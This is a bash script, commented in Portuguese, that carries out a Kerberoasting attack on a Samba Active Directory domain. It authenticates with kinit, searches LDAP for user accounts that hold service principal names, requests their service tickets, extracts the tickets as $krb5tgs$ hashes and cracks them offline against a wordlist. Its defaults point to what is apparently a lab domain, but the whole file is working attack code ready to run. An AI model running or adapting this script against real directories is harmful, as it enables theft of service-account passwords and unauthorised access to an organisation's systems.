#!/bin/bash
# Kerberoasting contra Samba AD usando Kerberos NATIVO (kinit+kvno) para contornar
# o bug de parsing de TGS-REQ do impacket contra o KDC Heimdal do Samba.
# Uso: kerberoast.sh <user> <pass> [wordlist]
set -euo pipefail
USR="${1:?uso: kerberoast.sh <user> <pass> [wordlist]}"
PASS="${2:?informe a senha}"
WORDLIST="${3:-/opt/lists/passwords.txt}"
DC_IP="${DC_IP:-172.30.0.10}"
REALM="${REALM:-CORP.LAB}"
DOMAIN_DN="${DOMAIN_DN:-dc=corp,dc=lab}"
PY="/root/.local/share/pipx/venvs/impacket/bin/python"
export KRB5CCNAME="/tmp/kerberoast_${USR}.cc"

echo "[*] kinit ${USR}@${REALM}"
printf '%s' "$PASS" | kinit -c "$KRB5CCNAME" "${USR}@${REALM}"

echo "[*] Enumerando contas com SPN (Kerberoastable) via LDAP..."
SPNS=$(ldapsearch -x -H "ldap://${DC_IP}" -D "${USR}@${REALM,,}" -w "$PASS" \
        -b "$DOMAIN_DN" "(&(servicePrincipalName=*)(objectCategory=person)(!(sAMAccountName=krbtgt)))" \
        servicePrincipalName 2>/dev/null | awk '/^servicePrincipalName: /{print $2}')
[ -z "$SPNS" ] && { echo "[!] Nenhum SPN em conta de usuario."; exit 1; }

for spn in $SPNS; do echo "    kvno $spn"; kvno -c "$KRB5CCNAME" "$spn" >/dev/null 2>&1 || true; done

echo "[*] Extraindo hashes \$krb5tgs\$ do ccache..."
"$PY" /usr/local/bin/ccache2hashcat.py "$KRB5CCNAME" | tee /tmp/kerberoast.hashes

echo "[*] Crackeando offline (wordlist: $WORDLIST)..."
"$PY" /usr/local/bin/kerbcrack.py /tmp/kerberoast.hashes "$WORDLIST"
echo "[*] Hashes salvos em /tmp/kerberoast.hashes (use hashcat -m 13100 p/ wordlists grandes)."
